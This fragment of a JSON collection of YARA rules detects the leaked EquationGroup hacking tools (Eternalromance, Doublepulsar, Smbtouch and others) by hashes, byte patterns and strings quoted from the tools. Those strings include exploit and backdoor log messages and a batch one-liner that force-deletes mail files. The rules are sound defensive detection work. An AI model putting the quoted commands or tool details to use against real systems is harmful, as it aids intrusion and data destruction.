  "EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1": "rule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"0cdde7472b077610d0068aa7e9035da89fe5d435549749707cae24495c8d8444\"\n   strings:\n      $x1 = \"[-] Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n      $s2 = \"[!]Warning: Error on first request - path size may actually be larger than indicated.\" fullword ascii\n      $s4 = \"<http://%s/%s> (Not <locktoken:write1>) <http://%s/>\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Architouch_1_0_0": "rule EquationGroup_Toolset_Apr17_Architouch_1_0_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc\"\n   strings:\n      $s1 = \"[+] Target is %s\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1": "rule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"3d11fe89ffa14f267391bc539e6808d600e465955ddb854201a1f31a9ded4052\"\n   strings:\n      $x1 = \"[-] Error appending shellcode buffer\" fullword ascii\n      $x2 = \"[-] Shellcode is too big\" fullword ascii\n      $x3 = \"[+] Exploit Payload Sent!\" fullword ascii\n      $x4 = \"[+] Bound to Dimsvc, sending exploit request to opnum 29\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0": "rule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"61f98b12c52739647326e219a1cf99b5440ca56db3b6177ea9db4e3b853c6ea6\"\n   strings:\n      $x1 = \"[+] Connected to target %s:%d\" fullword ascii\n      $x2 = \"[-] build_exploit_run_x64():\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0": "rule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"b439ed18262aec387984184e86bfdb31ca501172b1c066398f8c56d128ba855a\"\n   strings:\n      $x1 = \"[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)\" fullword ascii\n      $x2 = \"[%s] - Error building DLL loading shellcode\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0": "rule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"4cce9e39c376f67c16df3bcd69efd9b7472c3b478e2e5ef347e1410f1105c38d\"\n   strings:\n      $x1 = \"[+] Shellcode Callback %s:%d\" fullword ascii\n      $x2 = \"[+] Exploiting Target\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1": "rule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13\"\n   strings:\n      $x1 = \"[+] Ping returned Target architecture: %s - XOR Key: 0x%08X\" fullword ascii\n      $x2 = \"[.] Sending shellcode to inject DLL\" fullword ascii\n      $x3 = \"[-] Error setting ShellcodeFile name\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1": "rule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"729eacf20fe71bd74e57a6b829b45113c5d45003933118b53835779f0b049bad\"\n   strings:\n      $x1 = \"[-] Unable to connect to broswer named pipe, target is NOT vulnerable\" fullword ascii\n      $x2 = \"[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable\" fullword ascii\n      $x3 = \"[+] Bound to Dimsvc, target IS vulnerable\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 30KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Smbtouch_1_1_1": "rule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a\"\n   strings:\n      $x1 = \"[+] Target is vulnerable to %d exploit%s\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0": "rule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"f4b958a0d3bb52cb34f18ea293d43fa301ceadb4a259d3503db912d0a9a1e4d8\"\n   strings:\n      $x1 = \"[!] A vulnerable target will not respond.\" fullword ascii\n      $x2 = \"[-] Target NOT Vulernable\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 30KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0": "rule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"f6b9caf503bb664b22c6d39c87620cc17bdb66cef4ccfa48c31f2a3ae13b4281\"\n   strings:\n      $x1 = \"[-] Touching the target failed!\" fullword ascii\n      $x2 = \"[-] OS fingerprint not complete - 0x%08x!\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Rpctouch_2_1_0": "rule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"7fe4c3cedfc98a3e994ca60579f91b8b88bf5ae8cf669baa0928508642c5a887\"\n   strings:\n      $x1 = \"[*] Failed to detect OS / Service Pack on %s:%d\" fullword ascii\n      $x2 = \"[*] SMB String: %s (%s)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Mofconfig_1_0_0": "rule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c67a24fe2380331a101d27d6e69b82d968ccbae54a89a2629b6c135436d7bdb2\"\n   strings:\n      $x1 = \"[-] Get RemoteMOFTriggerPath error\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 50KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Easypi_Explodingcan": "rule EquationGroup_Toolset_Apr17_Easypi_Explodingcan {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"dc1ddad7e8801b5e37748ec40531a105ba359654ffe8bdb069bd29fb0b5afd94\"\n      hash2 = \"97af543cf1fb59d21ba5ec6cb2f88c8c79c835f19c8f659057d2f58c321a0ad4\"\n   strings:\n      $x1 = \"[-] %s - Target might not be in a usable state.\" fullword ascii\n      $x2 = \"[*] Exploiting Target\" fullword ascii\n      $x3 = \"[-] Encoding Exploit Payload failed!\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4": "rule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"46da99d80fc3eae5d1d5ab2da02ed7e61416e1eafeb23f37b180c46e9eff8a1c\"\n   strings:\n      $x1 = \"[-] The target is NOT vulnerable\" fullword ascii\n      $x2 = \"[+] The target IS VULNERABLE\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Iistouch_1_2_2": "rule EquationGroup_Toolset_Apr17_Iistouch_1_2_2 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c433507d393a8aa270576790acb3e995e22f4ded886eb9377116012e247a07c6\"\n   strings:\n      $x1 = \"[-] Are you being redirectect? Need to retarget?\" fullword ascii\n      $x2 = \"[+] IIS Target OS: %s\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 60KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0": "rule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"cb5849fcbc473c7df886828d225293ffbd8ee58e221d03b840fd212baeda6e89\"\n      hash2 = \"043d1c9aae6be65f06ab6f0b923e173a96b536cf84e57bfd7eeb9034cd1df8ea\"\n   strings:\n      $s1 = \"[*] Summary: %d pipes found\" fullword ascii\n      $s3 = \"[+] Testing %d pipes\" fullword ascii\n      $s6 = \"[-] Error on SMB startup, aborting\" fullword ascii\n      $s12 = \"92a761c29b946aa458876ff78375e0e28bc8acb0\" fullword ascii\n\n      $op1 = { 68 10 10 40 00 56 e8 e1 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 40KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_Easybee_1_0_1": "rule EquationGroup_Toolset_Apr17_Easybee_1_0_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"59c17d6cb564edd32c770cd56b5026e4797cf9169ff549735021053268b31611\"\n   strings:\n      $x1 = \"@@for /f \\\"delims=\\\" %%i in ('findstr /smc:\\\"%s\\\" *.msg') do if not \\\"%%MsgFile1%%\\\"==\\\"%%i\\\" del /f \\\"%%i\\\"\" fullword ascii\n      $x2 = \"Logging out of WebAdmin (as target account)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Regread_1_1_1": "rule EquationGroup_Toolset_Apr17_Regread_1_1_1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26\"\n   strings:\n      $s1 = \"[+] Connected to the Registry Service\" fullword ascii\n      $s2 = \"f08d49ac41d1023d9d462d58af51414daff95a6a\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0": "rule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"2a6ab28885ad7d5d64ac4c4fb8c619eca3b7fb3be883fc67c90f3ea9251f34c6\"\n   strings:\n      $x1 = \"[+] CheckCredentials(): Checking to see if valid username/password\" fullword ascii\n      $x2 = \"Error connecting to target, TbMakeSocket() %s:%d.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch": "rule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"444979a2387530c8fbbc5ddb075b15d6a4717c3435859955f37ebc0f40a4addc\"\n      hash2 = \"92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34\"\n      hash3 = \"108243f61c53f00f8f1adcf67c387a8833f1a2149f063dd9ef29205c90a3c30a\"\n   strings:\n      $s1 = \"NtErrorMoreProcessingRequired\" fullword ascii\n      $s2 = \"Command Format Error: Error=%x\" fullword ascii\n      $s3 = \"NtErrorPasswordRestriction\" fullword ascii\n\n      $op0 = { 8a 85 58 ff ff ff 88 43 4d }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 600KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_Eternalromance_2": "rule EquationGroup_Toolset_Apr17_Eternalromance_2 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d\"\n      hash2 = \"b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b\"\n      hash3 = \"92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34\"\n   strings:\n      $x1 = \"[+] Backdoor shellcode written\" fullword ascii\n      $x2 = \"[*] Attempting exploit method %d\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17__Emphasismine": "rule EquationGroup_Toolset_Apr17__Emphasismine {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"dcaf91bd4af7cc7d1fb24b5292be4e99c7adf4147892f6b3b909d1d84dd4e45b\"\n      hash2 = \"348eb0a6592fcf9da816f4f7fc134bcae1b61c880d7574f4e19398c4ea467f26\"\n   strings:\n      $x1 = \"Error: Could not calloc() for shellcode buffer\" fullword ascii\n      $x2 = \"shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X\" fullword ascii\n      $x3 = \"Generating shellcode\" fullword ascii\n      $x4 = \"([0-9a-zA-Z]+) OK LOGOUT completed\" fullword ascii\n      $x5 = \"Error: Domino is not the expected version. (%s, %s)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Eternalromance": "rule EquationGroup_Toolset_Apr17_Eternalromance {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d\"\n      hash2 = \"b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b\"\n   strings:\n      $x1 = \"[-] Error: Exploit choice not supported for target OS!!\" fullword ascii\n      $x2 = \"Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed\" fullword ascii\n      $x3 = \"[-] Error: Backdoor not present on target\" fullword ascii\n      $x4 = \"***********    TARGET ARCHITECTURE IS X64    ************\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them\n}",
  "EquationGroup_Toolset_Apr17_Gen4": "rule EquationGroup_Toolset_Apr17_Gen4 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"fe7ce2fdb245c62e4183c728bc97e966a98fdc8ffd795ed09da23f96e85dcdcd\"\n      hash2 = \"0989bfe351342a7a1150b676b5fd5cbdbc201b66abcb23137b1c4de77a8f61a6\"\n      hash3 = \"270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4\"\n      hash4 = \"7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e\"\n      hash5 = \"c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0\"\n      hash6 = \"9d98e044eedc7272823ba8ed80dff372fde7f3d1bece4e5affb21e16f7381eb2\"\n      hash7 = \"dfce29df4d198c669a87366dd56a7426192481d794f71cd5bb525b08132ed4f7\"\n      hash8 = \"87fdc6c32b9aa8ae97c7efbbd5c9ae8ec5595079fc1488f433beef658efcb4e9\"\n      hash9 = \"722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26\"\n      hash10 = \"d94b99908f528fa4deb56b11eac29f6a6e244a7b3aac36b11b807f2f74c6d8be\"\n      hash11 = \"4b07d9d964b2c0231c1db7526237631bb83d0db80b3c9574cc414463703462d3\"\n      hash12 = \"30b63abde1e871c90df05137ec08df3fa73dedbdb39cb4bd2a2df4ca65bc4e53\"\n      hash13 = \"02c1b08224b7ad4ac3a5b7b8e3268802ee61c1ec30e93e392fa597ae3acc45f7\"\n      hash14 = \"690f09859ddc6cd933c56b9597f76e18b62a633f64193a51f76f52f67bc2f7f0\"\n   strings:\n      $x1 = \"[+] \\\"TargetPort\\\"      %hu\" fullword ascii\n      $x2 = \"---<<<  Complete  >>>---\" fullword ascii\n      $x3 = \"[+] \\\"NetworkTimeout\\\"  %hu\" fullword ascii\n\n      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 150KB and ( 1 of ($x*) or 2 of them ) )\n}",
  "EquationGroup_Toolset_Apr17_Gen1": "rule EquationGroup_Toolset_Apr17_Gen1 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"1b5b33931eb29733a42d18d8ee85b5cd7d53e81892ff3e60e2e97f3d0b184d31\"\n      hash2 = \"139697168e4f0a2cc73105205c0ddc90c357df38d93dbade761392184df680c7\"\n   strings:\n      $x1 = \"Restart with the new protocol, address, and port as target.\" fullword ascii\n      $x2 = \"TargetPort      : %s (%u)\" fullword ascii\n      $x3 = \"Error: strchr() could not find '@' in account name.\" fullword ascii\n      $x4 = \"TargetAcctPwd   : %s\" fullword ascii\n      $x5 = \"Creating CURL connection handle...\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Gen2": "rule EquationGroup_Toolset_Apr17_Gen2 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"7fe425cd040608132d4f4ab2671e04b340a102a20c97ffdcf1b75be43a9369b5\"\n      hash2 = \"561c0d4fc6e0ff0a78613d238c96aed4226fbb7bb9ceea1d19bc770207a6be1e\"\n      hash3 = \"f2e90e04ddd05fa5f9b2fec024cd07365aebc098593d636038ebc2720700662b\"\n      hash4 = \"8f7e10a8eedea37ee3222c447410fd5b949bd352d72ef22ef0b2821d9df2f5ba\"\n   strings:\n      $s1 = \"[+] Setting password : (NULL)\" fullword ascii\n      $s2 = \"[-] TbBuffCpy() failed!\" fullword ascii\n      $s3 = \"[+] SMB negotiation\" fullword ascii\n      $s4 = \"12345678-1234-ABCD-EF00-0123456789AB\" fullword ascii\n      $s5 = \"Value must end with 0000 (2 NULLs)\" fullword ascii\n      $s6 = \"[*] Configuring Payload\" fullword ascii\n      $s7 = \"[*] Connecting to listener\" fullword ascii\n\n      $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 }\n      $op2 = { eb 59 8b 4c 24 10 68 1c 46 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of ($s*) and 1 of ($op*) ) or 3 of them\n}",
  "EquationGroup_Toolset_Apr17_Gen3": "rule EquationGroup_Toolset_Apr17_Gen3 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      super_rule = 1\n      hash1 = \"270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4\"\n      hash2 = \"7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e\"\n      hash3 = \"c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0\"\n      hash4 = \"9d98e044eedc7272823ba8ed80dff372fde7f3d1bece4e5affb21e16f7381eb2\"\n      hash5 = \"dfce29df4d198c669a87366dd56a7426192481d794f71cd5bb525b08132ed4f7\"\n      hash6 = \"87fdc6c32b9aa8ae97c7efbbd5c9ae8ec5595079fc1488f433beef658efcb4e9\"\n      hash7 = \"722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26\"\n      hash8 = \"d94b99908f528fa4deb56b11eac29f6a6e244a7b3aac36b11b807f2f74c6d8be\"\n      hash9 = \"4b07d9d964b2c0231c1db7526237631bb83d0db80b3c9574cc414463703462d3\"\n      hash10 = \"30b63abde1e871c90df05137ec08df3fa73dedbdb39cb4bd2a2df4ca65bc4e53\"\n      hash11 = \"02c1b08224b7ad4ac3a5b7b8e3268802ee61c1ec30e93e392fa597ae3acc45f7\"\n      hash12 = \"690f09859ddc6cd933c56b9597f76e18b62a633f64193a51f76f52f67bc2f7f0\"\n   strings:\n      $s1 = \"Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)\" fullword ascii\n      $s2 = \"[-] Could not set \\\"CredentialType\\\"\" fullword ascii\n\n      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 150KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_yak": "rule EquationGroup_Toolset_Apr17_yak {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"66ff332f84690642f4e05891a15bf0c9783be2a64edb2ef2d04c9205b47deb19\"\n   strings:\n      $x1 = \"-xd = dump archive data & store in scancodes.txt\" fullword ascii\n      $x2 = \"-------- driver start token -------\" fullword wide\n      $x3 = \"-------- keystart token -------\" fullword wide\n      $x4 = \"-xta = same as -xt but show special chars & store in keys_all.txt\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 800KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_AdUser_Implant": "rule EquationGroup_Toolset_Apr17_AdUser_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"fd2efb226969bc82e2e38769a10a8a751138db69f4594a8de4b3c0522d4d885f\"\n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s2 = \"(&(objectCategory=person)(objectClass=user)(cn=\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_RemoteExecute_Implant": "rule EquationGroup_Toolset_Apr17_RemoteExecute_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"770663c07c519677316934cf482e500a73540d9933342c425f3e56258e6e6d8b\"\n   strings:\n      $op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00\n               00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00\n               65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00\n               00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68\n               5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00\n               63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00\n               6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00\n               57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00\n               44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00\n               6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00\n               00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00\n               53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Banner_Implant9x": "rule EquationGroup_Toolset_Apr17_Banner_Implant9x {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"5d69a8cfc9b636448f023fcf18d111f13a8e6bcb9a693eb96276e0d796ab4e0c\"\n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n\n      $op1 = { c9 c3 57 8d 85 2c eb ff ff }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 20KB and all of them )\n}",
